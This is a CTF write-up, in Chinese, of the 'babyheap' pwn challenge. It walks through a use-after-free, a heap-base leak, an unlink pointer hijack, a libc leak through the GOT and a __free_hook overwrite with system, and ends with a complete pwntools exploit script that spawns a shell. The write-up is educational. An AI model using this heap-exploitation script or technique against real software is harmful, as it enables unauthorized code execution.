title: babyheap
categories:
- PWN
---

# 网鼎杯第一场

- 程序功能:新建,编辑,打印,free
- free处没有置空指针,导致可以uaf
- malloc每次都是0x20的fastbin,编辑功能可以使用3次
- 自写了readn函数,没有溢出点
- edit可以修改free后堆块的bk,fd

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- Full RELRO导致got表不可写,所以只能劫持__malloc_hook或者__free_hook_来劫持程序的流程
- 现在面临两个问题,一个是泄露程序基址,一个是控制指针
- 关于泄露程序基址的问题,我们可以采用先劫持指针再leak的方法,比如指向got表的一部分,然后打印它的值
- 这里我采用unlink的方法来劫持指针,首先通过fastbin的性质,并且和存在的UAF泄露堆基址,然后利用一次edit来实现fastbin堆块的分配
- 这里我们可以用错位生成的fastbin的数据段进行修改出一个fake chunk,并且通过unlink劫持一根指指针
- 我劫持的是chunklist[9],因为这样我相当于同时控制了3根指针
- 拿到指针的控制权后,首先修改edit次数,因为count在全局变量里是int型,所以我将其修改成了0xfffffff0,也就是一个负数,这样我就可以无限次数的edit
- 随后打印got表内容,算出偏移,再次edit指针,将其指向__free_hook_,并且覆写其为system函数,free之前写好的包含"/bin/sh\x00"的堆块

# exp

```python
from pwn import *

r = process("./babyheap")
ptr = 0x602060
sys_libc = 0x45390
atoi_libc = 0x36E80

def add(index,content):
    r.sendlineafter("Choice:","1")
    r.sendlineafter("Index:",str(index))
    if len(content) == 32:
        r.sendafter("Content:",content)
    else:
        r.sendlineafter("Content:",content)

def edit(index,content):
    r.sendlineafter("Choice:","2")
    r.sendlineafter("Index:",str(index))
    if len(content) == 32:
        r.sendafter("Content:",content)
    else:
        r.sendlineafter("Content:",content)

def show(index):
    r.sendlineafter("Choice:","3")
    r.sendlineafter("Index:",str(index))

def free(index):
    r.sendlineafter("Choice:","4")
    r.sendlineafter("Index:",str(index))

def exp():
    add(9,p64(0x31)*4)
    add(0,p64(0x31)*4)
    add(1,p64(0x31)*4)
    add(2,p64(0x31)*4)

    free(1)
    free(0)
    free(9)
    show(9)
    heapbase = u64(r.recv(4) + '\x00'*4) -0x30 #heapbase
    print "%x"%heapbase
    payload = "a"*8 + p64(0x80) + p64(ptr + 8 * 9 - 0x18) + p64(ptr + 8 * 9 - 0x10)
    add(3,payload)
    edit(0,p64(heapbase + 0x80))       #fastbin
    add(4,"/bin/sh\x00")
    add(5,p64(0x80)+p64(0x90)+"flag")
    add(6,"flag")
    add(7,"flag"*8)
    add(8,"flag"*8)
    free(2) #unlink
    
    payload = p64(0x6020B0) + p64(0x601FE8)
    edit(9,payload)
    edit(6,p64(4294967286)) #count edit

    show(7)
    atoi = u64(r.recv(6) + '\x00\x00')
    hook = atoi - atoi_libc + 3958696
    sys = atoi - atoi_libc + sys_libc
    print "hook %x"%hook
    print "sys %x"%sys
    payload = p64(hook)
    edit(9,payload)
    edit(6,p64(sys))
    free(4)
    r.interactive()

if __name__=="__main__":
    exp()
```
